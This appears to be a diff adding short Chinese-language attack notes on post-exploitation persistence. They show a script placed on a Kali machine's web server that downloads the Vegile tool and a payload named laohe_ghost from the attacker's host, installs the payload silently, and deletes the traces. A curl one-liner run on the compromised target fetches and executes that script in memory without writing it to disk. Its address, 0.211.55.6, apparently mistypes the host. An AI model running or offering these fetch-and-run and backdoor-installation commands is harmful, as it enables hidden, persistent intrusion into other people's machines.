@@ -1,0 +1,45 @@
+需要目标机执行
+
+#####在攻击机创建
+┌──(root💀kali-linux-2021-3)-[~]
+└─# cd /var/www/html          
+                                                                                                                                                                               
+┌──(root💀kali-linux-2021-3)-[/var/www/html]
+└─# vim laohe.sh 
+
+#!/bin/bash
+cd /tmp
+wget http://10.211.55.6/Vegile-master.zip && unzip Vegile-master.zip && cd Vegile-master && chmod +x Vegile && wget http://10.211.55.6/laohe_ghost && chmod +x laohe_ghost && echo y | ./Vegile --i laohe_ghost >> /dev/null 2>&1
+相当于使用任意键 echo y |
+laohe.sh这个脚本文件不需要添加权限
+
+rm -rf /tmp/Vegile-master.zip /tmp/Vegile-master
+
+####靶机执行（8080那台机器拿到权限后，执行）
+bash <(curl -s -L http://0.211.55.6/laohe.sh) >> /dev/null 2>&1
+-s 静默，不输出任何东西
+-L 跟http链接，下载到内存，不保存到磁盘
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
